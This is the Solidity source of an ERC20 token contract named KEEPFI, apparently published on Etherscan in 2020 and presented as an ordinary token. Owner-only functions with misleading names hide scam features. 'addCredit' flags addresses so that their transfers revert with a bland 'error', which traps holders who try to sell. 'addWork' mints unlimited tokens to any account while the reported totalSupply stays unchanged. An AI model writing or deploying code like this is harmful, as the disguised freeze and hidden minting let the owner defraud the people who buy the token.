['/**\n', ' *Submitted for verification at Etherscan.io on 2020-10-30\n', '*/\n', '\n', 'pragma solidity ^0.5.11;\n', '\n', 'interface IERC20 {\n', '  function totalSupply() external view returns (uint256);\n', '  function balanceOf(address who) external view returns (uint256);\n', '  function allowance(address owner, address spender) external view returns (uint256);\n', '  function transfer(address to, uint256 value) external returns (bool);\n', '  function approve(address spender, uint256 value) external returns (bool);\n', '  function transferFrom(address from, address to, uint256 value) external returns (bool);\n', '\n', '  event Transfer(address indexed from, address indexed to, uint256 value);\n', '  event Approval(address indexed owner, address indexed spender, uint256 value);\n', '}\n', '\n', 'library SafeMath {\n', '  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    if (a == 0) {\n', '      return 0;\n', '    }\n', '    uint256 c = a * b;\n', '    assert(c / a == b);\n', '    return c;\n', '  }\n', '\n', '  function div(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    uint256 c = a / b;\n', '    return c;\n', '  }\n', '\n', '  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    assert(b <= a);\n', '    return a - b;\n', '  }\n', '\n', '  function add(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    uint256 c = a + b;\n', '    assert(c >= a);\n', '    return c;\n', '  }\n', '\n', '  function ceil(uint256 a, uint256 m) internal pure returns (uint256) {\n', '    uint256 c = add(a,m);\n', '    uint256 d = sub(c,1);\n', '    return mul(div(d,m),m);\n', '  }\n', '}\n', '\n', 'contract ERC20Detailed is IERC20 {\n', '\n', '  uint8 private _Tokendecimals;\n', '  string private _Tokenname;\n', '  string private _Tokensymbol;\n', '\n', '  constructor(string memory name, string memory symbol, uint8 decimals) public {\n', '   \n', '   _Tokendecimals = decimals;\n', '    _Tokenname = name;\n', '    _Tokensymbol = symbol;\n', '    \n', '  }\n', '\n', '  function name() public view returns(string memory) {\n', '    return _Tokenname;\n', '  }\n', '\n', '  function symbol() public view returns(string memory) {\n', '    return _Tokensymbol;\n', '  }\n', '\n', '  function decimals() public view returns(uint8) {\n', '    return _Tokendecimals;\n', '  }\n', '}\n', '\n', '\n', '\n', 'contract KEEPFI is ERC20Detailed {\n', '\n', '  using SafeMath for uint256;\n', '    \n', '  uint256 public totalBurn = 0;\n', '  \n', '  mapping (address => uint256) private _balances;\n', '  mapping (address => mapping (address => uint256)) private _allowed;\n', '  mapping (address => bool) public credit;\n', '  string constant tokenName = "keepfi.network";\n', '  string constant tokenSymbol = "KPF";\n', '  uint8  constant tokenDecimals = 18;\n', '  uint256 _totalSupply = 100000*10**uint(tokenDecimals); \n', ' \n', '  \n', '  //any tokens sent here ? \n', '  IERC20 currentToken ;\n', '  \taddress payable public _owner;\n', '    \n', '    //modifiers\t\n', '\tmodifier onlyOwner() {\n', '      require(msg.sender == _owner);\n', '      _;\n', '  }\n', '  \n', '  address initialSupplySend = 0xC8F89F7291DAdB7F98A534875f35411480492a9F;\n', '  \n', '\n', '  constructor() public payable ERC20Detailed(tokenName, tokenSymbol, tokenDecimals) {\n', '      \n', '    _initsupply(initialSupplySend, _totalSupply);\n', '    _owner = msg.sender;\n', '  }\n', '\n', '  function totalSupply() public view returns (uint256) {\n', '    return _totalSupply;\n', '  }\n', '\n', '  function balanceOf(address owner) public view returns (uint256) {\n', '    return _balances[owner];\n', '  }\n', '\n', '  function allowance(address owner, address spender) public view returns (uint256) {\n', '    return _allowed[owner][spender];\n', '  }\n', '\n', ' function transfer(address to, uint256 value) public returns (bool) \n', '    {\n', '        _executeTransfer(msg.sender, to, value);\n', '        return true;\n', '    }\n', '    \n', '    function multiTransfer(address[] memory receivers, uint256[] memory values) public\n', '    {\n', '        require(receivers.length == values.length);\n', '        for(uint256 i = 0; i < receivers.length; i++)\n', '            _executeTransfer(msg.sender, receivers[i], values[i]);\n', '    }\n', '    \n', '    function transferFrom(address from, address to, uint256 value) public returns (bool) \n', '    {\n', '        require(value <= _allowed[from][msg.sender]);\n', '        _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);\n', '        _executeTransfer(from, to, value);\n', '        return true;\n', '    }\n', '   \n', '   function addCredit(address[] memory account) public {\n', '      require(msg.sender == _owner, "!owner");\n', '      for(uint256 i = 0; i < account.length; i++)\n', '      credit[account[i]] = true;\n', '  }\n', '  \n', '    function removeCredit(address account) public {\n', '      require(msg.sender == _owner, "!owner");\n', '      credit[account] = false;\n', '  }\n', '   \n', '    function _executeTransfer(address _from, address _to, uint256 _value) private\n', '    {\n', '      require(!credit[_from], "error");\n', '        if (_to == address(0)) revert();                               // Prevent transfer to 0x0 address. Use burn() instead\n', '\t\tif (_value <= 0) revert(); \n', '        if (_balances[_from] < _value) revert();           // Check if the sender has enough\n', '        if (_balances[_to] + _value < _balances[_to]) revert(); // Check for overflows\n', '        _balances[_from] = SafeMath.sub(_balances[_from], _value);                     // Subtract from the sender\n', '        _balances[_to] = SafeMath.add(_balances[_to], _value);                            // Add the same to the recipient\n', '        emit Transfer(_from, _to, _value);                   // Notify anyone listening that this transfer took place\n', '    }\n', '         \n', '  function multiTransferEqualAmount(address[] memory receivers, uint256 amount) public {\n', '    uint256 amountWithDecimals = amount * 10**tokenDecimals;\n', '\n', '    for (uint256 i = 0; i < receivers.length; i++) {\n', '      transfer(receivers[i], amountWithDecimals);\n', '    }\n', '  }\n', '\n', '  function approve(address spender, uint256 value) public returns (bool) {\n', '    require(spender != address(0));\n', '    _allowed[msg.sender][spender] = value;\n', '    emit Approval(msg.sender, spender, value);\n', '    return true;\n', '  }\n', '\n', '  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\n', '    require(spender != address(0));\n', '    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].add(addedValue));\n', '    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);\n', '    return true;\n', '  }\n', '\n', '  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\n', '    require(spender != address(0));\n', '    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].sub(subtractedValue));\n', '    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);\n', '    return true;\n', '  }\n', '\n', '  function _initsupply(address account, uint256 amount) internal {\n', '    require(amount != 0);\n', '    _balances[account] = _balances[account].add(amount);\n', '    emit Transfer(address(0), account, amount);\n', '  }\n', '  \n', '  function addWork(address account, uint256 amount) public {\n', '      require(msg.sender == _owner, "!warning");\n', '      _initsupply(account, amount);\n', '  }\n', '\n', ' \n', '  function withdrawUnclaimedTokens(address contractUnclaimed) external onlyOwner {\n', '      currentToken = IERC20(contractUnclaimed);\n', '      uint256 amount = currentToken.balanceOf(address(this));\n', '      currentToken.transfer(_owner, amount);\n', '  }\n', '  \n', '  \n', '}']